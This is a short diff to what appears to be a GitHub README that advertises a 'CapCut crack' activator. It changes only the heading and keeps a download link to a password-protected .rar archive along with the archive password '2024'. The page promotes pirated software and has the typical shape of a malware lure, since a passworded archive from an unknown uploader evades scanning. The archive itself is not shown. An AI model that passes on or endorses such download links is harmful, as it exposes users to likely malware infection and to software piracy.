@@ -1,4 +1,4 @@
-# <h1 align="center">CapCut crack for pc</h1>
+# <h1 align="center">CapCut crack</h1>
 [DOWNLOAD](https://github.com/Danni91/CapCut-Detscop-crack-activator/raw/refs/heads/main/CapCut%20Detscop%20crack%20Activator%202024.rar)
 # Archive password:   2024
 
